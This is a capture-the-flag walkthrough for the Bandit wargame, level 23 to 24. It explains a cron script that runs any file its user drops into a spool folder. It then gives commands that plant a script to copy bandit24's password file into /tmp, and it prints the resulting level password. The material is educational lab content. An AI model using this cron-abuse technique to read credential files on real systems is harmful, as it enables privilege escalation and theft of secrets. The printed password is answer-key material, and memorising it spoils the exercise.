# 🔐 Bandit Level: Bandit23 ➝ Bandit24

## 📂 Command(s) used:
👉 
- cd /etc/cron.d/
- ls
- cat cronjob_bandit24
- cat /usr/bin/cronjob_bandit24.sh
- cd
- mkdir /tmp/mydir
  cd /tmp/mydir
- echo '#!/bin/bash' > getpass.sh
  echo 'cat /etc/bandit_pass/bandit24 > /tmp/mydir/pass.txt' >> getpass.sh
  chmod +x getpass.sh
- cp getpass.sh /var/spool/bandit24/foo/
- cat /tmp/mydir/pass.txt

<img width="687" height="565" alt="Screenshot 2025-08-29 at 1 10 00 AM" src="https://github.com/user-attachments/assets/8db8336d-bcd3-42c6-9716-de8fb4837769" />


## 📄 Password found:
👉 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
## Notes 
##🔎 Understanding the Cronjob Script
The file /usr/bin/cronjob_bandit24.sh looks like this:
```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*; do
    if [ "$i" != "." -a "$i" != ".." ]; then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "$owner" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
## 🔑 Key points:
- It runs every minute (cron job).
- It checks the folder: /var/spool/bandit24/foo/.
- If the file owner is bandit23 (you) → it executes that file (max 60 sec).
- Then it deletes the file.
👉 This means: you can place your own script in that folder, and it will run with bandit24’s permissions.
## ⚙️ Steps to Exploit
1. Create a temporary working directory
```
mkdir /tmp/bandit23hack
cd /tmp/bandit23hack
```
2. Create a script that steals bandit24’s password
```
nano getpass.sh
```
Paste this inside:
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23hack/pass.txt
```
Save and exit.
3. Make the script executable
```
chmod +x getpass.sh
```
4. Copy the script to the cronjob folder
```
cp getpass.sh /var/spool/bandit24/foo/
```
5. Wait for 1 minute (cronjob will run it)
6. Read the stolen password
```
cat /tmp/bandit23hack/pass.txt
```
This will show you the bandit24 password ✅
## 🎯 Summary
- Cronjob runs your script if owned by bandit23.
- Your script copies bandit24’s password into a temp file.
- Wait 1 min → read the password.
